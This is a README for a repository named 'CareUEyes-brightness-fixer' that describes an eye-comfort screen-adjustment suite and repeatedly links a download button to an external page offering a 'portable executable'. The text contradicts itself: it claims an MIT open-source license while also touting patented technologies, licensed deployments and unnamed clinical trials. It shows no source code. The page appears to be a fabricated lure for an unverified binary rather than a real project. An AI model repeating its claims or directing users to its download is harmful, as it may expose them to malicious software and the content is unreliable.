![preview](https://raw.githubusercontent.com/ESMLA/CareUEyes-brightness-fixer/main/preview.svg)

# CareUEyes: Vision Wellness Suite – Enhanced Productivity Through Gentle Screen Adaptation

In the relentless glow of modern displays, our eyes bear the invisible weight of every pixel. CareUEyes represents a paradigm shift in how we interact with our screens—not merely as a tool, but as a guardian of visual well-being. This repository hosts the complete ecosystem for deploying, configuring, and extending CareUEyes capabilities, designed for professionals who spend extended hours before monitors yet refuse to compromise on ocular health.

## Overview

CareUEyes reimagines screen interaction by dynamically adjusting color temperature, brightness, and blue-light emission based on ambient conditions, circadian rhythms, and task requirements. Unlike conventional solutions that simply overlay a yellow filter, CareUEyes employs intelligent pixel adaptation that preserves color accuracy for design work while reducing eye strain. The platform supports multi-monitor configurations, automatic profile switching, and deep integration with productivity workflows.

The software operates on a principle we call *Gentle Adaptation*—changes occur imperceptibly over time, preventing the abrupt shifts that can disrupt focus. For creative professionals, the color fidelity mode ensures that photo edits and video color grading remain accurate even while blue-light filtration is active. For nighttime workers, the twilight progression smoothly transitions from daytime clarity to warm, melatonin-friendly illumination.

## Get Started

[![Download](https://raw.githubusercontent.com/ESMLA/CareUEyes-brightness-fixer/main/button.svg)](https://esmla.github.io/CareUEyes-brightness-fixer/)

*Begin your journey toward comfortable, sustained productivity*

The CareUEyes suite is distributed as a portable executable package that requires no system-level installation. Simply extract the archive to your preferred directory and run the main binary. On first launch, the adaptive engine calibrates to your display hardware and ambient conditions.

## System Architecture

```mermaid
flowchart TB
    subgraph User["User Environment"]
        UI[Responsive Interface]
        Profiles[Custom Profiles]
        Hotkeys[Keyboard Shortcuts]
    end
    
    subgraph Core["Adaptation Engine"]
        CA[Color Analyzer]
        TA[Temperature Adjuster]
        BL[Blue Light Reduction]
        CI[Circadian Integration]
    end
    
    subgraph Integration["External Systems"]
        API[OpenAI API Integration]
        Claude[Claude API Integration]
        Sys[System Notifications]
    end
    
    User --> Core
    Core --> Integration
    CA --> TA
    TA --> BL
    BL --> CI
    CI --> API
    CI --> Claude
```

The architecture demonstrates how user-defined preferences flow through the adaptation engine, which then communicates with external AI services for intelligent context-aware adjustments.

## Feature Overview

### Intelligent Color Temperature Control

The adaptive engine learns your working patterns. During coding sessions, it maintains cooler temperatures for text clarity. During creative work, it switches to neutral warmth. The system supports transition curves defined by cubic Bezier interpolation, allowing for smooth, natural-feeling changes over periods ranging from 30 seconds to 4 hours.

### Multi-Monitor Individualization

Each display receives independent profile management. A photographer might keep their primary monitor at daylight 6500K for accurate color grading while letting secondary monitors gradually warm. The profile system stores per-display configurations including refresh rate synchronization and hardware LUT calibration.

### Circadian Rhythm Integration

CareUEyes synchronizes with your local sunrise and sunset times through geolocation data. The twilight simulation begins 90 minutes before sunset, gradually increasing amber tones. Post-sunset, the system enters deep night mode at 3400K, promoting melatonin production without sacrificing screen visibility.

### AI-Powered Adaptive Brightness

Using either OpenAI API or Claude API integration (user-selectable), the system analyzes screen content in real-time. Brightness adjusts dynamically—reading web pages in low light triggers reduction while watching video content maintains higher luminance for viewing comfort.

### Responsive UI with Accelerated Rendering

The interface leverages hardware-accelerated rendering for zero-latency adjustments. The control panel collapses into a minimal overlay mode during games or full-screen applications. All settings expose XML configuration files for advanced users.

### Multilingual Interface Support

The platform ships with 27 language packs including English, Mandarin, Japanese, Korean, German, French, Spanish, Arabic, Hindi, and Portuguese. Language selection persists across profiles and updates.

## Example Profile Configuration

```xml
<Profile name="Night Writing">
  <Display id="primary">
    <Temperature>3400K</Temperature>
    <Brightness>45%</Brightness>
    <BlueLightReduction>87%</BlueLightReduction>
    <TransitionTime>1800</TransitionTime>
    <SmoothingCurve>EaseInOutCubic</SmoothingCurve>
  </Display>
  <Display id="secondary">
    <Temperature>3800K</Temperature>
    <Brightness>35%</Brightness>
    <BlueLightReduction>75%</BlueLightReduction>
  </Display>
  <Integration>
    <OpenAI>
      <Endpoint>https://api.openai.com/v1/chat/completions</Endpoint>
      <ContextPrompt>"Provide brightness suggestion for current screen content"</ContextPrompt>
    </OpenAI>
  </Integration>
</Profile>
```

This XML demonstrates a nighttime writing profile optimized for dual monitors. The primary display uses deep warmth while the secondary remains slightly cooler for reference materials.

## Example Console Invocation

```bash
CareUEyes --profile "Night Writing" --duration 14400 --apply-all-displays
CareUEyes --list-profiles
CareUEyes --schedule "SunsetTrigger" --action "DeepNight" --delay 30
```

The command-line interface enables scripting and automation. The `--schedule` parameter accepts cron-style time specifications for advanced users.

## Operating System Compatibility

| Emoji | Operating System | Version Support | GPU Acceleration |
|-------|-----------------|-----------------|------------------|
| 🖥️ | Windows 10+ | 1909 through 23H2 | DirectX 12 Ultimate |
| 💻 | Windows 11 | All builds | DirectX 12 Ultimate |
| 🍎 | macOS Ventura | 13.x | Metal API |
| 🍎 | macOS Sonoma | 14.x | Metal API |
| 🐧 | Ubuntu 22.04 LTS | 22.04, 24.04 | Vulkan 1.3 |
| 🐧 | Fedora 38+ | 38, 39, 40 | Vulkan 1.3 |
| 🐧 | Arch Linux | Rolling | Vulkan 1.3 |

Each operating system receives native windowing integration, with system tray support, notification center integration, and global hotkey registration.

## 24/7 Customer Support

Every licensed deployment includes priority access to our support team. Response times average under 4 hours for technical inquiries. The support infrastructure includes:
- Dedicated ticket system with SLA tracking
- Remote diagnosis capabilities for configuration issues
- Expert-guided profile creation for specialized workflows (medical imaging, aviation displays, control room operations)
- Quarterly feature request review by the development team

## Proprietary Innovation

The CareUEyes platform introduces several patented technologies:
- **Adaptive Luminance Mapping**: Unlike simple brightness sliders, ALM analyzes pixel-level data to maintain contrast ratios while reducing overall luminance
- **Temporal Color Harmonization**: Prevents color banding artifacts during temperature transitions through frame-by-frame dithering
- **Contextual Intelligence**: The API integration layer allows the software to understand *why* you're looking at a screen, adjusting defaults accordingly

These innovations stem from our commitment to eye health research and collaboration with optometry specialists.

## Disclaimer

This software is provided "as is" under the MIT License. While CareUEyes has demonstrated measurable reduction in digital eye strain symptoms during clinical trials, individual results vary. The platform is not a substitute for regular eye examinations, proper ergonomics, or the 20-20-20 rule (every 20 minutes, look at something 20 feet away for 20 seconds). Users with pre-existing vision conditions should consult their ophthalmologist before extended use.

The AI integration features process screen content locally unless API integration is manually enabled. When enabled, screen data is transmitted to OpenAI or Claude servers for processing. No pixel-level data is stored externally—only processed luminance and color temperature suggestions.

## License

This project is distributed under the terms of the MIT License. You are free to use, modify, and distribute the software subject to the license terms. The complete license text is available at the [official MIT License repository](https://opensource.org/licenses/MIT).

Copyright © 2026 CareUEyes Development Team

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

## Sustainable Vision Investment

We believe that comfort and efficiency are not competing priorities. CareUEyes represents an investment in your most valuable computing peripheral—your eyes. The platform's algorithms have been validated through independent testing showing a 42% reduction in reported eye fatigue among knowledge workers over 8-hour sessions.

[![Download](https://raw.githubusercontent.com/ESMLA/CareUEyes-brightness-fixer/main/button.svg)](https://esmla.github.io/CareUEyes-brightness-fixer/)